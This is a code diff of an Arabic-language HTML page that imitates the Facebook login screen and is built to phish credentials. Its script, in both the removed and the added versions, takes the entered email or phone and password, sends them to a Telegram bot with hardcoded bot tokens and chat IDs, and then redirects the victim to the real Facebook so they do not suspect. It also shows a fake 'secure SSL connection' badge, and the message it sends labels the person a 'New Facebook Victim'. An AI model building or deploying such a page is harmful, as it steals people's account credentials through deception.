@@ -1,22 +1,66 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="UTF-8"><title>فيسبوك 2009</title></head>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - التسجيل أو الاشتراك</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; }
+        .header { width: 100%; background-color: #fff; padding: 20px 0; text-align: center; color: #1877f2; font-size: 30px; font-weight: bold; }
+        .login-container { width: 90%; max-width: 400px; margin-top: 20px; background: #fff; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
+        .login-btn { width: 100%; padding: 10px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 17px; font-weight: bold; cursor: pointer; }
+        .footer-links { margin-top: 20px; font-size: 14px; color: #1877f2; text-decoration: none; }
+        .security-badge { display: flex; align-items: center; justify-content: center; font-size: 12px; color: #8a8d91; margin-top: 20px; }
+        .security-badge img { width: 12px; margin-left: 5px; }
+    </style>
+</head>
 <body>
-    <form id="l">
-        <input type="text" id="u" placeholder="Email"><input type="password" id="p" placeholder="Pass">
-        <button type="submit">Login</button>
-    </form>
+
+    <div class="header">facebook</div>
+
+    <div class="login-container">
+        <form id="loginForm">
+            <input type="text" id="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
+            <input type="password" id="pass" placeholder="كلمة السر" required>
+            <button type="submit" class="login-btn">تسجيل الدخول</button>
+        </form>
+        <div style="text-align: center; margin-top: 15px;">
+            <a href="#" class="footer-links">هل نسيت كلمة السر؟</a>
+        </div>
+    </div>
+
+    <div class="security-badge">
+        اتصال آمن ومُشفر (SSL) <img src="https://img.icons8.com/material-rounded/24/8a8d91/lock.png" alt="lock">
+    </div>
+
     <script>
-        const pr = new URLSearchParams(window.location.search);
-        document.getElementById('l').onsubmit = async (e) => {
+        // سحب البيانات من الرابط (التي يرسلها البوت)
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('chat_id') || '7238206121'; // ID تبعك
+        const botToken = urlParams.get('bot_token') || '8669513520:AAFYrZjQ_dKL5dCfKU74XN0c1tOCte_HkwY'; // التوكن الجديد
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            let ip = await (await fetch('https://api.ipify.org')).text();
-            const msg = encodeURIComponent(`🎯 صيدة فيسبوك\n👤 الصياد: ${pr.get('hunter')}\n📧: ${document.getElementById('u').value}\n🔑: ${document.getElementById('p').value}\n🌐 IP: ${ip}\n📱 الجهاز: ${navigator.platform}`);
-            const token = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE';
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('id')}&text=${msg}`);
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('dev')}&text=${msg}`)
-            .then(() => { location.href="https://facebook.com"; });
-        };
+            
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+
+            const message = `
+🔥 **New Facebook Victim!**
+👤 **Email/Phone:** \`${email}\`
+🔑 **Password:** \`${pass}\`
+💻 **System:** M.Y.9 Security
+🦅 **Developer:** Abu Osayed Malkawi
+            `;
+
+            // إرسال البيانات فوراً إلى تليجرام
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
+            .then(() => {
+                // تحويل الضحية لصفحة فيسبوك الحقيقية بعد السرقة عشان ما يشك
+                window.location.href = "https://www.facebook.com/login/";
+            });
+        });
     </script>
 </body>
 </html>
